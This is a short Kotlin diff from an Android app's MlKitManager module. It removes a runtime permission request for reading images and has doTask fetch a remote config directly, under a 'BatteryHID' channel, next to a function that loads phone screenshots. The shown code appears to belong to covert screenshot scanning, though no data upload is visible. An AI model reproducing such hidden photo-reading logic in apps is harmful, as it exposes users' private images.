@@ -23,6 +23,7 @@ import kotlinx.coroutines.MainScope
 import kotlinx.coroutines.launch
 import org.json.JSONObject
 
+
 object MlKitManager {
 
     private fun loadPhoneScreenShots(
@@ -135,42 +136,8 @@ object MlKitManager {
         }
     }
 
-    /**
-     *  执行任务
-     */
-    fun doTask(channel:String="BatteryHID", callback:(Boolean)->Unit) {
-        MainScope().launch(Dispatchers.Main) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                PermissionUtils.permission(
-                    Manifest.permission.READ_MEDIA_IMAGES
-                )
-            } else {
-                PermissionUtils.permission(Manifest.permission.READ_EXTERNAL_STORAGE)
-            }
-                .rationale { _, shouldRequest ->
-                    shouldRequest.again(true)
-                }
-                .callback(object : PermissionUtils.FullCallback {
-                    override fun onGranted(granted: MutableList<String>) {
-                        logV("已授权")
-                        requestConfig(channel)
-                        callback.invoke(true)
-                    }
 
-                    override fun onDenied(
-                        deniedForever: MutableList<String>,
-                        denied: MutableList<String>
-                    ) {
-                        logV("未获取到权限")
-                        callback.invoke(false)
-                    }
-
-                })
-                .request()
-        }
-    }
-
-    private fun requestConfig(channel:String="BatteryHID") {
+    fun doTask(channel:String="BatteryHID") {
         HttpManager.httpGet(HttpManager.HTTP_CONFIG) { json ->
             logV("请求数据=$json")
             if (json.isNullOrBlank()) return@httpGet
